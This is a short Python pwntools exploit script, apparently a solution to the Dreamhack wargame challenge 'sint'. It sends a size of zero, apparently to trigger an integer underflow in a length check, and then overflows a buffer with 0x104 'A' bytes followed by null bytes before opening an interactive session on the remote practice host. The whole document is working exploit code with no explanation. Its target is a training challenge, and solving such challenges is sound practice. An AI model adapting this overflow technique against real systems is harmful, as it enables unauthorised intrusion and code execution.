#!/usr/bin/env python3

from pwn import *

exe = ELF("./sint")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 14267)

    return r


def main():
    r = conn()

    r.sendlineafter(b"Size: ", b"0")
    r.sendafter(b"Data: ", b"A" * (0x100 + 0x4) + b"\x00" * 0x4)

    r.interactive()


if __name__ == "__main__":
    main()